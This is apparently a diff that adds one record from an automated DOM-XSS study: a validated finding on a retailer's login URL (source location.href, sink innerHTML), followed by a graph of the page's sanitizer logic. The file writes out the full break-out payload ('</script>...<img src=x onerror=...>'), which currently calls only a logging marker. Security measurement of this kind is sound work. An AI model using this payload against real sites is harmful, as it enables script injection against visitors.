@@ -1,0 +1,76 @@
+// Finding: 7dbd3d85-e0e0-42ac-bc40-6f5fab638efc
+// Finding.url: https://www.example128.com/webapp/wcs/stores/servlet/MSResLogin?catalogId=10051&myAcctMain=1&langId=-24&storeId=10151&intid=header_sign-in_sign-in&pagestat=</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('2ac40b6ea75f4b7896e61f40772c8a13')><!--/*
+// Finding.parentloc: https://www.example128.com/webapp/wcs/stores/servlet/MSResLogin?catalogId=10051&myAcctMain=1&langId=-24&storeId=10151&intid=header_sign-in_sign-in&pagestat=</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('2ac40b6ea75f4b7896e61f40772c8a13')><!--/*
+// Finding.domain: www.example128.com
+// Finding.base_domain: example128.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: <synthetic>
+// Sanitizer.location: example18.com
+// Finding.begin: 0
+// Finding.end: 15
+// Finding.original_uuid: ecd354ec-8eff-43a1-aaf0-486a114cdcff
+// Finding.TwentyFiveMillionFlowsId: -1335182551
+// Finding.script: https://tags.example101.com/utag/marksandspencer/main/prod/utag.318.js?utv=ut4.46.202105050855
+// Finding.line: 55
+// Exploit.uuid: 2ac40b6e-a75f-4b78-96e6-1f40772c8a13
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: text
+// Exploit.content: &pagestat=
+// Exploit.quote_type: None
+// Exploit.tag: None
+// Exploit.break_out: pagestat=</iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: pagestat=</iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 152
+// Exploit.end_taint_url: 169
+// Exploit.replace_begin_url: 152
+// Exploit.replace_end_url: 169
+// Exploit.replace_begin_param: 83
+// Exploit.replace_end_param: 100
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: true
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: -90114724
+// DepGraph.sanitizer_hash: 1781099973
+// Merged split and join statements 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="split"];
+n2 [shape=box, label="Lit: ?"];
+n3 [shape=box, label="Var: x"];
+n4 [shape=ellipse, label="preg_replace"];
+n5 [shape=box, label="RegExp: /[&]/"];
+n6 [shape=box, label="Lit: &"];
+n7 [shape=box, label="Var: x"];
+n8 [shape=box, label="Var: x"];
+n9 [shape=doubleoctagon, label="Return: x"];
+n3 -> n0;
+n1 -> n2;
+n1 -> n3;
+n7 -> n1;
+n4 -> n5;
+n4 -> n6;
+n4 -> n7;
+n8 -> n4;
+n9 -> n8;
+}
